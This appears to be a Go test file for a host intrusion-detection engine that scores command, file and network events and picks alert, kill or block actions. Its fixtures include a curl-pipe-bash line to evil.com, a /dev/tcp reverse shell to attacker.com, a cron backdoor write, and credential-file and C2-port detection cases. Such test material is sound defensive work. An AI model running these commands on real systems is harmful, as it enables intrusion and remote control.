package main

import (
	"testing"
	"time"
)

func TestEvaluateCommandHeuristic(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantMatched  bool
		wantMinConf  float32
		wantCategory string
	}{
		{
			name: "curl pipe bash",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/usr/bin/curl",
				CommandLine: "curl http://evil.com/script.sh | bash",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "curl_pipe",
		},
		{
			name: "benign ls",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/ls",
				CommandLine: "ls -la",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  false,
			wantCategory: "command",
		},
		{
			name: "cron tampering",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/bash",
				CommandLine: "bash -c 'echo \"* * * * * /tmp/malware\" > /etc/cron.d/backdoor'",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.6,
			wantCategory: "command",
		},
		{
			name: "crontab -e",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/usr/bin/crontab",
				CommandLine: "crontab -e",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.6,
			wantCategory: "command",
		},
		{
			name: "reverse shell",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/bash",
				CommandLine: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "interactive_shell",
		},
		{
			name: "powershell download",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "powershell",
				CommandLine: "powershell -enc SQBFAFgAN...",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "powershell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateCommandHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f", result.Confidence, tt.wantMinConf)
			}
			if result.Category != tt.wantCategory {
				t.Errorf("category = %q, want %q", result.Category, tt.wantCategory)
			}
		})
	}
}

func TestEvaluateFileHeuristic(t *testing.T) {
	tests := []struct {
		name        string
		event       Event
		wantMatched bool
		wantMinConf float32
	}{
		{
			name: "write to /etc/shadow",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/shadow",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "write to /etc/passwd",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/passwd",
				FileFlags: "O_RDWR",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.4,
		},
		{
			name: "read /etc/passwd",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/passwd",
				FileFlags: "O_RDONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.4,
		},
		{
			name: "write to /etc/passwd alerts only",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/passwd",
				FileFlags: "O_WRONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.4,
		},
		{
			name: "write to ssh authorized_keys",
			event: Event{
				EventType: EventTypeOpenat,
				FilePath:  "/home/user/.ssh/authorized_keys",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "create file in /tmp",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/tmp/malware.sh",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.5,
		},
		{
			name: "write to /var/log/syslog",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/var/log/syslog",
				FileFlags: "O_WRONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.7,
		},
		{
			name: "benign read from /home",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/home/user/documents/file.txt",
				FileFlags: "O_RDONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "benign write to /home",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/home/user/output.txt",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "write to /etc/ssh/sshd_config",
			event: Event{
				EventType: EventTypeOpenat,
				FilePath:  "/etc/ssh/sshd_config",
				FileFlags: "O_RDWR",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.8,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateFileHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f (reason: %s)", result.Confidence, tt.wantMinConf, result.Reason)
			}
		})
	}
}

func TestEvaluateNetworkHeuristic(t *testing.T) {
	tests := []struct {
		name        string
		event       Event
		wantMatched bool
		wantMinConf float32
	}{
		{
			name: "connect to netcat port 4444",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "10.0.0.1",
				RemotePort: 4444,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
		{
			name: "connect to Back Orifice port 31337",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "10.0.0.1",
				RemotePort: 31337,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
		{
			name: "connect to common port 80",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "93.184.216.34",
				RemotePort: 80,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "connect to port 5555",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "192.168.1.100",
				RemotePort: 5555,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateNetworkHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f", result.Confidence, tt.wantMinConf)
			}
		})
	}
}

func TestEvaluateNetworkWithServerParent(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-nginx-1000",
		ProcessID:   1000,
		ImagePath:   "/usr/sbin/nginx",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:  EventTypeConnect,
		ParentGUID: "host-nginx-1000",
		RemoteAddr: "10.0.0.99",
		RemotePort: 8080,
		ProcessID:  2000,
		HostName:   "test",
		Timestamp:  time.Now(),
	}

	result := evaluateNetworkHeuristic(event, cache)
	if !result.Matched {
		t.Error("expected match for connection from server process")
	}
	if result.Confidence < 0.5 {
		t.Errorf("confidence = %.2f, want >= 0.5", result.Confidence)
	}
}

func TestEvaluateCommandWithServiceSpawningShell(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-nginx-500",
		ProcessID:   500,
		ImagePath:   "/usr/sbin/nginx",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:   EventTypeExecve,
		ParentGUID:  "host-nginx-500",
		ImagePath:   "/bin/bash",
		CommandLine: "bash -c 'ls'",
		ProcessID:   600,
		HostName:    "test",
		Timestamp:   time.Now(),
	}

	result := evaluateCommandHeuristic(event, cache)
	if !result.Matched {
		t.Error("expected match for nginx spawning bash (not in allowlist)")
	}
	if result.Confidence < 0.7 {
		t.Errorf("confidence = %.2f, want >= 0.7", result.Confidence)
	}
}

func TestSshdSpawningShellAllowed(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-sshd-500",
		ProcessID:   500,
		ImagePath:   "/usr/sbin/sshd",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:   EventTypeExecve,
		ParentGUID:  "host-sshd-500",
		ImagePath:   "/bin/bash",
		CommandLine: "bash -c 'ls'",
		ProcessID:   600,
		HostName:    "test",
		Timestamp:   time.Now(),
	}

	result := evaluateCommandHeuristic(event, cache)
	for _, a := range result.Actions {
		if a.ActionType == ActionKillPID {
			t.Errorf("ssh->bash should be allowed, but got KILL action: %s", a.Reason)
		}
	}
}

func TestEvaluateHeuristicDispatch(t *testing.T) {
	tests := []struct {
		name    string
		event   Event
		wantCat string
	}{
		{"execve dispatch", Event{EventType: EventTypeExecve, CommandLine: "curl http://x|bash", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "curl_pipe"},
		{"open dispatch", Event{EventType: EventTypeOpen, FilePath: "/etc/shadow", FileFlags: "O_WRONLY", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
		{"openat dispatch", Event{EventType: EventTypeOpenat, FilePath: "/etc/passwd", FileFlags: "O_RDWR", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
		{"connect dispatch", Event{EventType: EventTypeConnect, RemotePort: 4444, RemoteAddr: "1.2.3.4", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "c2_default"},
		{"unknown type", Event{EventType: "something_else"}, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateHeuristic(tt.event, nil)
			if result.Category != tt.wantCat {
				t.Errorf("category = %q, want %q", result.Category, tt.wantCat)
			}
		})
	}
}

func TestIsCronTampering(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"bash -c 'echo * * * * * /tmp/x > /etc/cron.d/backdoor'", true},
		{"crontab -e", true},
		{"echo job > /var/spool/cron/user", true},
		{"cat /etc/crontab", false},
		{"ls -la", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := isCronTampering(tt.cmd); got != tt.expected {
				t.Errorf("isCronTampering(%q) = %v, want %v", tt.cmd, got, tt.expected)
			}
		})
	}
}

func TestIsTempPath(t *testing.T) {
	tests := []struct {
		path     string
		expected bool
	}{
		{"/tmp/malware.sh", true},
		{"/var/tmp/payload", true},
		{"/dev/shm/run", true},
		{"/home/user/file", false},
		{"/opt/app/bin", false},
	}

	for _, tt := range tests {
		if got := isTempPath(tt.path); got != tt.expected {
			t.Errorf("isTempPath(%q) = %v, want %v", tt.path, got, tt.expected)
		}
	}
}

func TestFileRuleActionTypes(t *testing.T) {
	tests := []struct {
		name       string
		path       string
		flags      string
		wantAction ActionType
	}{
		{"shadow read kills", "/etc/shadow", "O_RDONLY", ActionKillPID},
		{"shadow write kills", "/etc/shadow", "O_WRONLY", ActionKillPID},
		{"id_rsa read kills", "/root/.ssh/id_rsa", "O_RDONLY", ActionKillPID},
		{"gnupg read kills", "/root/.gnupg/secring.gpg", "O_RDONLY", ActionKillPID},
		{"passwd read alerts", "/etc/passwd", "O_RDONLY", ActionAlert},
		{"passwd write alerts", "/etc/passwd", "O_WRONLY", ActionAlert},
		{"sudoers write kills", "/etc/sudoers", "O_WRONLY", ActionKillPID},
		{"authorized_keys write kills", "/home/u/.ssh/authorized_keys", "O_WRONLY|O_CREAT", ActionKillPID},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateFileHeuristic(Event{
				EventType: EventTypeOpen,
				FilePath:  tt.path,
				FileFlags: tt.flags,
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			}, nil)
			if !result.Matched {
				t.Fatalf("expected match for %s %s", tt.path, tt.flags)
			}
			found := false
			for _, a := range result.Actions {
				if a.ActionType == tt.wantAction {
					found = true
				}
			}
			if !found {
				t.Errorf("expected an %s action for %s %s, got %+v", tt.wantAction, tt.path, tt.flags, result.Actions)
			}
		})
	}
}

func TestServerParentConnectAlertsNotBlocks(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-php-fpm-1000",
		ProcessID:   1000,
		ImagePath:   "/usr/sbin/php-fpm",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:  EventTypeConnect,
		ParentGUID: "host-php-fpm-1000",
		RemoteAddr: "10.0.0.99",
		RemotePort: 8080,
		ProcessID:  2000,
		HostName:   "test",
		Timestamp:  time.Now(),
	}

	result := evaluateNetworkHeuristic(event, cache)
	if !result.Matched {
		t.Fatal("expected match for connection from server process")
	}
	for _, a := range result.Actions {
		if a.ActionType == ActionBlockIP {
			t.Errorf("server-process connect must not BLOCK_IP (bricks DHCP/cron/php-fpm), got %s", a.ActionType)
		}
	}
}

func TestNetworkRulePortStillBlocks(t *testing.T) {
	event := Event{
		EventType:  EventTypeConnect,
		RemoteAddr: "10.0.0.1",
		RemotePort: 4444,
		ProcessID:  100,
		HostName:   "test",
		Timestamp:  time.Now(),
	}
	result := evaluateNetworkHeuristic(event, nil)
	found := false
	for _, a := range result.Actions {
		if a.ActionType == ActionBlockIP && a.Target == "10.0.0.1" {
			found = true
		}
	}
	if !found {
		t.Errorf("network-rule port match must BLOCK_IP, got %+v", result.Actions)
	}
}

func TestParseGUIDStartTime(t *testing.T) {
	tests := []struct {
		name   string
		guid   string
		want   uint64
		wantOK bool
	}{
		{"host with dashes", "my-host.local-1234-567890123", 567890123, true},
		{"simple host", "bench-host-1234-567890", 567890, true},
		{"no guid", "", 0, false},
		{"empty start", "bench-host-1234-", 0, false},
		{"non numeric start", "bench-host-1234-abc", 0, false},
		{"bare pid", "1234", 0, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := parseGUIDStartTime(tt.guid)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("parseGUIDStartTime(%q) = (%d, %v), want (%d, %v)", tt.guid, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

func TestKillPIDTarget(t *testing.T) {
	withGUID := Event{ProcessID: 42, ProcessGUID: "host-42-999999999"}
	if got := killPIDTarget(withGUID); got != "42@999999999" {
		t.Errorf("killPIDTarget(with GUID) = %q, want %q", got, "42@999999999")
	}
	noGUID := Event{ProcessID: 42}
	if got := killPIDTarget(noGUID); got != "42" {
		t.Errorf("killPIDTarget(no GUID) = %q, want %q", got, "42")
	}
}
